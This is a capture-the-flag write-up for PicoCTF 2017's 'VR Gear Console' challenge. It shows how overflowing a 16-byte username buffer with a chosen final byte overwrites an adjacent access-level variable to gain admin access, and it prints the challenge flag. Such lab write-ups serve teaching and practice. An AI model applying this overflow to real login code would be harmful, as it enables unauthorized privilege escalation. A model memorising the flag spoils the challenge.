# PicoCTF 2017- Level 2 - Binary Exploitation 6

**Title:** VR Gear Console  
**Category:** Binary Exploitation  
**Points:** 95  
**Description:**

>Here's the VR gear admin console. See if you can figure out a way to log in. The problem is found here: /problems/d07d574d3d27c5eeb03bce97956ef1c3  

**Hint:**

>What happens if you read in more characters than the length of the username buffer?  
>You should look at an ascii table to see what character you need to choose.  
>Numbers are stored in little-endian format, which means that the lowest byte of the number is first.  
>"cat file - | vrgearconsole " will keep the pipe open for commands.  

## Solution

First let's check what's in the program folder:  
    $ cd /problems/d07d574d3d27c5eeb03bce97956ef1c3  
    $ ls -l  
    total 16  
    -r--r----- 1 hacksports vr-gear-console_4   33 Apr 16  2017 flag.txt  
    -rwxr-sr-x 1 hacksports vr-gear-console_4 7024 Apr 16  2017 vrgearconsole  
    -rw-rw-r-- 1 hacksports hacksports        2104 Mar 14  2017 vrgearconsole.c  

We can check the [source](vrgearconsole.c) and find a potential buffer overflow in the `login()` function:  
```C
int accessLevel = 0xff;  
char username[16];  
char password[32];  
```

Let's try:

    $ ./vrgearconsole  
    [...]  
    Username (max 15 characters): 0123456789abcdefg  
    Password (max 31 characters): a  
    Your access level is: 0x00000067  
    Login successful.  
    You do not have permission to access this resource.  

We can see that even if our username/password combo doesn't exist we are still successfully logging into the system. Also the overflowing char is overwriting the `accessLevel` variable.  
Since we need the `accessLevel` to be equal to `2` to be admin, our last char will need to convert to a hexadecimal number starting by `2`. For example, let's use `/` (`2f` in hexadecimal):  

    $ ./vrgearconsole  
    [...]  
    Username (max 15 characters): 0123456789abcdef/  
    Password (max 31 characters): a  
    Your access level is: 0x0000002f  
    Admin access granted!  
    The flag is in "flag.txt".  
    $ cat flag.txt  
    1ce8d7a95570d97333d52675fe099c27  

So the flag for this one is `1ce8d7a95570d97333d52675fe099c27`